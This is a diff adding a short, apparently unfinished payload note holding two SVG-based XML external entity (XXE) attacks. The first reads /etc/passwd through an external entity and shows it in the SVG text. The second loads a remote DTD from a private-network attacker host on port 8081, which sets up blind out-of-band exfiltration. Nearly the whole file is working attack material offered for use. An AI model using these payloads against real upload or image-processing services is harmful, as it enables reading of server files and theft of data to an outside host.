@@ -1,0 +1,7 @@
+// (For non-blind.)
+<?xml version ="1.0" standalone="yes"?><!DOCTYPE evil [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+(To remote back to PHP Server instead.)
+<?xml version ="1.0"?><!DOCTYPE evil [<!ENTITY % remote SYSTEM '"'"'http://10.10~:8081/localevil.dtd'"'"'>%remote;%init;%trick;]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+// Still being written.
